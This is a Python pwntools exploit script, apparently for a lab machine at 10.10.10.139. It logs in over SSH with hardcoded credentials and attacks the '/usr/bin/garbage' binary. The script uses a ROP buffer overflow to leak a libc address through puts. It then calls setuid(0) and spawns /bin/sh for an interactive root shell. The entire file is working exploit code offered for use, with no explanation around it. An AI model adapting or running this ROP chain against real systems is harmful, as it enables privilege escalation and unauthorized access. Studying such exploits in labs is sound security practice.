#!/usr/bin/python3

from pwn import *

# Functions
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

def leak_libc_address(p, elf, libc, rop):

    # PUTS(__libc_main_start)
	# rdi, rsi, rdx, rcx, r8, r9
	# gadget -> pop rdi, ret
	# rdi -> __libc_main_start
	# PUTS() -> rdi -> __libc_main_start -> PUTS(__libc_main_start)
    
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    #log.info("pop rdi ret -> %s" % hex(POP_RDI) )

    LIBC = elf.symbols["__libc_start_main"]
    MAIN = elf.symbols["main"]
    PUTS = elf.plt["puts"]

    log.info("pop rdi ret -> %s" % hex(LIBC) )
    log.info("pop rdi ret -> %s" % hex(MAIN) )
    log.info("pop rdi ret -> %s" % hex(PUTS) )


    offset = 136
    payload = b"A"*offset
    payload += p64(POP_RDI)
    payload += p64(LIBC)
    payload += p64(PUTS)
    payload += p64(MAIN)
    
    p.recvuntil(b"password:")
    p.sendline(payload)

    p.recvline()
    p.recvline()

    leaked_libc = p.recvline().strip()
    leaked_libc = u64(leaked_libc.ljust(8, b"\x00"))
    log.info("Leaked libc address -> %s " % hex(leaked_libc))
    return leaked_libc


def shell(p, elf, libc, rop):

    # system("/bin/sh")
	# rdi, rsi, rdx, rcx, r8, r9
	# gadget -> pop rdi, ret
	# rdi -> "/bin/sh"
	# system() -> rdi? -> "/bin/sh" -> system("/bin/sh")
    RET = (rop.find_gadget(['ret']))[0]
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    BIN_SH = next(libc.search(b"/bin/sh"))
    SYSTEM = libc.sym["system"]
    
    offset = 136
    payload = b"A"*offset
    payload += p64(RET)
    payload += p64(POP_RDI)
    payload += p64(BIN_SH)
    payload += p64(SYSTEM)

    p.recvuntil(b"password:")
    p.sendline(payload)

    p.interactive()
    

def setuid(p, elf, libc, rop):

    #setuid(0)
    #rdi, rsi, rdx, rcx, r8, r9
    #gadget -> pop rdi, set
    #rdi -> 0
    #setuid -> rdi? -> setuid(0)

    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    SETUID = libc.sym["setuid"]
    MAIN = elf.symbols["main"]

    offset = 136
    payload = b"A"*offset
    payload += p64(POP_RDI)
    payload += p64(0)
    payload += p64(SETUID)
    payload += p64(MAIN)

    p.recvuntil(b"password:")
    p.sendline(payload)


#ctrl + c
signal.signal(signal.SIGINT, def_handler)


if __name__ == "__main__":

    r = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
    p = r.process("/usr/bin/garbage")

    elf = ELF("./garbage")
    libc = ELF("../exploits/libc.so.6")
    rop = ROP(elf)

    leaked_libc_address = leak_libc_address(p, elf, libc, rop)

    # Real Leak_libc_address
    libc.address = leaked_libc_address - libc.sym["__libc_start_main"]
    log.info("Real libc leaked -> %s" % hex(libc.address))
    setuid(p, elf, libc, rop)
    shell(p, elf, libc, rop)
    
